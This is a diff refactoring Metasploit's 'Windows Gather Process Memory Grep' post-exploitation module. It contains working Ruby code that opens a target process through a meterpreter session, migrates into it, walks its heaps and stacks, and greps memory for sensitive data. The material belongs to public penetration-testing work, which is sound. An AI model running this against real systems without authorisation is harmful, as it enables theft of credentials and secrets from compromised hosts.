@@ -1,36 +1,50 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
+class MetasploitModule < Msf::Post
 
-class Metasploit3 < Msf::Post
-
-  def initialize(info={})
-    super( update_info(info,
-      'Name'           => 'Windows Gather Process Memory Grep',
-      'Description'    => %q{
-          This module allows for searching the memory space of a proccess for potentially
-        sensitive data.  Please note: When the HEAP option is enabled, the module will have
-        to migrate to the process you are grepping, and will not migrate back automatically.
-        This means that if the user terminates the application after using this module, you
-        may lose your session.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         => ['bannedit'],
-      'Platform'       => ['win'],
-      'SessionTypes'   => ['meterpreter' ]
-    ))
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Gather Process Memory Grep',
+        'Description' => %q{
+          This module allows for searching the memory space of a process for potentially
+          sensitive data.  Please note: When the HEAP option is enabled, the module will have
+          to migrate to the process you are grepping, and will not migrate back automatically.
+          This means that if the user terminates the application after using this module, you
+          may lose your session.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => ['bannedit'],
+        'Platform' => ['win'],
+        'SessionTypes' => ['meterpreter' ],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              core_migrate
+              stdapi_railgun_api
+              stdapi_sys_process_attach
+              stdapi_sys_process_getpid
+              stdapi_sys_process_memory_query
+              stdapi_sys_process_memory_read
+              stdapi_sys_process_thread_open
+            ]
+          }
+        }
+      )
+    )
     register_options([
-      OptString.new('PROCESS', [true,  'Name of the process to dump memory from', nil]),
-      OptRegexp.new('REGEX',   [true,  'Regular expression to search for with in memory', nil]),
-      OptBool.new('HEAP',      [false, 'Grep from heap', false])
-    ], self.class)
+      OptString.new('PROCESS', [true, 'Name of the process to dump memory from', nil]),
+      OptRegexp.new('REGEX', [true, 'Regular expression to search for with in memory', nil]),
+      OptBool.new('HEAP', [false, 'Grep from heap', false])
+    ])
   end
 
   def get_data_from_stack(target_pid)
-    proc  = client.sys.process.open(target_pid, PROCESS_ALL_ACCESS)
+    proc = client.sys.process.open(target_pid, PROCESS_ALL_ACCESS)
     stack = []
     begin
       threads = proc.thread.each_thread do |tid|
@@ -59,13 +73,12 @@ class Metasploit3 < Msf::Post
       print_status("Migrating into #{target_pid} to allow for dumping heap data")
       session.core.migrate(target_pid)
     end
-    proc  = client.sys.process.open(target_pid, PROCESS_ALL_ACCESS)
+    proc = client.sys.process.open(target_pid, PROCESS_ALL_ACCESS)
 
-    railgun = session.railgun
-    heap_cnt = railgun.kernel32.GetProcessHeaps(nil, nil)['return']
-    dheap = railgun.kernel32.GetProcessHeap()['return']
+    heap_cnt = session.railgun.kernel32.GetProcessHeaps(nil, nil)['return']
+    dheap = session.railgun.kernel32.GetProcessHeap()['return']
     vprint_status("Default Process Heap: 0x%08x" % dheap)
-    ret = railgun.kernel32.GetProcessHeaps(heap_cnt, heap_cnt * 4)
+    ret = session.railgun.kernel32.GetProcessHeaps(heap_cnt, heap_cnt * 4)
     pheaps = ret['ProcessHeaps']
 
     idx = 0
@@ -81,7 +94,7 @@ class Metasploit3 < Msf::Post
     handles.each do |handle|
       lpentry = "\x00" * 42
       ret = ''
-      while (ret = railgun.kernel32.HeapWalk(handle, lpentry)) and ret['return']
+      while (ret = session.railgun.kernel32.HeapWalk(handle, lpentry)) and ret['return']
         entry = ret['lpEntry'][0, 4].unpack('V')[0]
         pointer = proc.memory.read(entry, 512)
         size = ret['lpEntry'][4, 4].unpack('V')[0]
@@ -160,6 +173,5 @@ class Metasploit3 < Msf::Post
       dump_data(pid)
       print_line
     end
-
   end
 end
